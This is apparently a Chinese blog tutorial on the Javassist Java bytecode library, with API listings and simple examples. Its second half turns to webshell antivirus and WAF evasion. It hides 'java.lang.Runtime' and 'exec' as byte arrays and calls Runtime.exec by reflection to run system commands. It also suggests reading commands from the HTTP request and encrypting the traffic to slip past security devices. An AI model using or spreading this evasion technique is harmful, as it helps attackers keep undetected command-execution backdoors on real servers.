Java Javassist**
<a name="S4ddR"></a>
## 1 Javassist 介绍
Java 字节码以二进制的形式存储在 class 文件中，每一个 class 文件包含一个 Java 类或接口。Javaassist 就是一个用来处理 Java 字节码的类库。<br />`Javassist`是一个开源的分析、编辑和创建Java字节码的类库。
<a name="HRg9G"></a>
## 2 Javassist 使用
这里主要讲一下主要的几个类：
<a name="pCaSS"></a>
### ClassPool
`ClassPool`：一个基于哈希表（`Hashtable`）实现的`CtClass`对象容器，其中键名是类名称，值是表示该类的`CtClass`对象（`Hashtable`和`Hashmap`类似都是实现map接口，hashmap可以接收null的值，但是Hashtable不行）。
<a name="wfd2W"></a>
#### 常用方法：
```java
static ClassPool getDefault()
 返回默认的类池。
ClassPath insertClassPath(java.lang.String pathname) 
 在搜索路径的开头插入目录或jar（或zip）文件。
ClassPath insertClassPath(ClassPath cp) 
 ClassPath在搜索路径的开头插入一个对象。
java.lang.ClassLoader getClassLoader() 
 获取类加载器toClass()，getAnnotations()在 CtClass等
CtClass get(java.lang.String classname) 
 从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用。
ClassPath appendClassPath(ClassPath cp) 
 将ClassPath对象附加到搜索路径的末尾。
CtClass makeClass(java.lang.String classname)
 创建一个新的public类
```
<a name="1WHjb"></a>
### CtClass
`CtClass`表示类，一个`CtClass`(编译时类）对象可以处理一个`class`文件，这些`CtClass`对象可以从`ClassPoold`的一些方法获得。
<a name="zvGd6"></a>
#### 常用方法：
```java
void setSuperclass(CtClass clazz)
 更改超类，除非此对象表示接口。
java.lang.Class<?> toClass(java.lang.invoke.MethodHandles.Lookup lookup) 
 将此类转换为java.lang.Class对象。
byte[] toBytecode() 
 将该类转换为类文件。
void writeFile() 
 将由此CtClass 对象表示的类文件写入当前目录。
void writeFile(java.lang.String directoryName) 
 将由此CtClass 对象表示的类文件写入本地磁盘。
CtConstructor makeClassInitializer() 
 制作一个空的类初始化程序（静态构造函数）。
```
<a name="S7RIL"></a>
### CtMethod
`CtMethod`：表示类中的方法。
<a name="Ls2JW"></a>
### CtConstructor
CtConstructor的实例表示一个构造函数。它可能代表一个静态构造函数（类初始化器）。
<a name="abFyK"></a>
#### 常用方法
```java
void setBody(java.lang.String src) 
 设置构造函数主体。
void setBody(CtConstructor src, ClassMap map) 
 从另一个构造函数复制一个构造函数主体。
CtMethod toMethod(java.lang.String name, CtClass declaring) 
 复制此构造函数并将其转换为方法。
```
<a name="wv8Fn"></a>
### ClassClassPath
该类作用是用于通过 getResourceAsStream（） 在 java.lang.Class 中获取类文件的搜索路径。<br />构造方法：
```java
ClassClassPath(java.lang.Class<?> c) 
 创建一个搜索路径。
```
<a name="pg7is"></a>
#### 常见方法：
```java
java.net.URL find (java.lang.String classname) 
 获取指定类文件的URL。
java.io.InputStream openClassfile(java.lang.String classname) 
 通过获取类文getResourceAsStream()。
```
<a name="6xMiG"></a>
#### 代码实例：
```java
ClassPool pool = ClassPool.getDefault();
```
在默认系统搜索路径获取`ClassPool`对象。<br />如果需要修改类搜索的路径需要使用`insertClassPath`方法进行修改。
```java
pool.insertClassPath(new ClassClassPath(this.getClass()));
```
将本类所在的路径插入到搜索路径中
<a name="nwryV"></a>
### toBytecode
```java
import javassist.*;

import java.io.IOException;
import java.util.Arrays;

/**
 * TestAsist
 * <p>
 * encoding:UTF-8
 *
 * @author Fcant 上午 10:46 2020/10/16/0016
 */
public class TestSsist {

    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(demo.class.getClass()));
        CtClass ctClass = pool.get("com.fcant.tools.example.ssist.Test");
        ctClass.setSuperclass(pool.get("com.fcant.tools.example.ssist.Test"));
//        System.out.println(ctClass);
        byte[] bytes = ctClass.toBytecode();
        String s = Arrays.toString(bytes);
        System.out.println(s);
    }
}
```
![image.png](https://cdn.nlark.com/yuque/0/2020/png/396745/1602817052855-e88aaaad-00ef-4d39-93a9-f90a5dbb2e48.png#align=left&display=inline&height=687&originHeight=2060&originWidth=3840&size=764781&status=done&style=none&width=1280)
<a name="0gZqE"></a>
### toClass
```java
Hello类：
public class Hello {
    public void say() {
        System.out.println("Hello");
    }
}
Test 类
public class Test {
    public static void main(String[] args) throws Exception {
        ClassPool cp = ClassPool.getDefault();// 在默认系统搜索路径获取ClassPool对象。
        CtClass cc = cp.get("com.fcant.tools.example.ssist.Hello");  // 获取hello类的
        CtMethod m = cc.getDeclaredMethod("say"); // 获取hello类的say方法
        m.insertBefore("{ System.out.println(\"Hello.say():\"); }");// 在正文的开头插入字节码
        Class c = cc.toClass();// 将此类转换为java.lang.Class对象
        Hello h = (Hello)c.newInstance(); // 反射创建对象并进行强转
        h.say(); // 调用方法say
    }
}
```
![image.png](https://cdn.nlark.com/yuque/0/2020/png/396745/1602817279528-35cb448d-ec87-4169-b44a-e9e44a927b22.png#align=left&display=inline&height=687&originHeight=2060&originWidth=3840&size=783149&status=done&style=shadow&width=1280)
<a name="QYjZW"></a>
## 3 一些小想法
按照理解来说就是可以去将类和字节码进行互相转换。那么按照这个思路来延申的话，可以做到什么呢？首先想到的可能就是webshell的一些免杀，例如说Jsp的最常见的一些webshell，都是采用`Runtime`，`ProcessBuilder`这两个类去进行构造，执行命令。按照WAF的惯性这些设备肯定是把这些常见的执行命令函数给拉入黑名单里面去。那么如果说可以转换成字节码的话呢？字节码肯定是不会被杀的。如果说这时候将`Runtime`这个类转换成字节码，内嵌在Jsp中，后面再使用`Javassist`来将字节码还原成类的话，如果转换的几个方法没被杀的话，是可以实现过WAF的。当然这些也只是一些`臆想`,因为Javassist并不是JDK中自带的。但是类加载器肯定是可以去加载字节码，然后实现执行命令的。
<a name="SDBPn"></a>
## 4 想法实现
这里可以来思考一个问题，该怎么样才能动态传入参数去执行呢？那能想到的肯定是反射。如果用上面的思路，把全部代码都转换成字节码的话，其实就没有多大意义了。因为全是固定死的东西，他也只会执行并且得到同一个执行结果。<br />在这里能想到的就是将部分在代码里面固定死的代码给转换成字节码，然后再使用反射的方式去调用。
```java
public class test {
    public static void main(String[] args) {
        String string ="java.lang.Runtime";
        byte[] bytes1 = string.getBytes();
        System.out.println(Arrays.toString(bytes1))
    }
}
```
获取结果：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/396745/1602817394531-e92797f1-f498-4a03-8fc6-d1d0fe73460a.png#align=left&display=inline&height=311&originHeight=932&originWidth=2796&size=202755&status=done&style=shadow&width=932)<br />现在已经是把结果给获取到了，但是需要知道字节码怎么样还原为String类型。<br />在后面翻阅资料的时候，发现String的构造方法就直接能执行，来看看他的官方文档。<br />![](https://cdn.nlark.com/yuque/0/2020/png/396745/1602815762502-74c5876f-fecd-4311-98b0-7d5a39ed7975.png#align=left&display=inline&height=229&originHeight=229&originWidth=1080&size=0&status=done&style=none&width=1080)<br />使用bytes去构造一个新的String<br />代码：
```java
public class test {
    public static void main(String[] args) {
        byte[] bytes = new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101};
        String s = new String(bytes);
        System.out.println(s);
    }
}
```
![image.png](https://cdn.nlark.com/yuque/0/2020/png/396745/1602817649053-0b1d1dc1-ea4d-421a-92e9-11e7c02b9fa0.png#align=left&display=inline&height=269&originHeight=808&originWidth=3098&size=171059&status=done&style=shadow&width=1032.6666666666667)
```java
public class test {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {
        byte[] b1 = new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101};
        String run = new String(b1);
        String command = "ipconfig";
        Class aClass = Class.forName(run);
        Constructor declaredConstructor = aClass.getDeclaredConstructor();
        declaredConstructor.setAccessible(true);
        Object o = declaredConstructor.newInstance();
        Method exec = aClass.getMethod("exec", String.class);
        Process process = (Process) exec.invoke(o,command);
        InputStream inputStream = process.getInputStream();    //获取输出的数据
        String ipconfig = IOUtils.toString(inputStream,"gbk"); //字节输出流转换为字符
        System.out.println(ipconfig);
    }
}
```
![image.png](https://cdn.nlark.com/yuque/0/2020/png/396745/1602817766094-4e9b024c-3c7f-4d96-add6-9d227ced8fa9.png#align=left&display=inline&height=687&originHeight=2060&originWidth=3840&size=914936&status=done&style=shadow&width=1280)<br />命令执行成功。<br />那么这就是一段完整的代码，但是还有些地方处理得不是很好，比如：
```java
Method exec = aClass.getMethod("exec", String.class);
```
这里是反射获取`exec`方法，这里的exec是固定的。`exec`这个对于一些设备来说也是严杀的。<br />那么在这里就可以来处理一下，也转换成字节码。<br />转换后的字节码：<br />[101,120,101,99]<br />改进一下代码：
```java
public class test {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {
        String command = "ipconfig";
        byte[] b1 = new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101};
        String run = new String(b1);
        byte[] b2 = new byte[]{101, 120, 101, 99};
        String cm = new String(b2);
        
        Class aClass = Class.forName(run);
        Constructor declaredConstructor = aClass.getDeclaredConstructor();
        declaredConstructor.setAccessible(true);
        Object o = declaredConstructor.newInstance();
        Method exec = aClass.getMethod(cm, String.class);
        Process process = (Process) exec.invoke(o,command);
        InputStream inputStream = process.getInputStream();    //获取输出的数据
        String ipconfig = IOUtils.toString(inputStream,"gbk"); //字节输出流转换为字符
        System.out.println(ipconfig);
    }
}
```
实际中运用不会直接定义命令的关键字`ipconfig`和`command`，这些都是一些敏感词。这里只是为了方便理解。<br />在真实情况下应该是`request.getInputStream()`来获取输入的命令的。那么这里也还需要注意传输的时候进行加密，不然流量肯定也是过不了设备的。
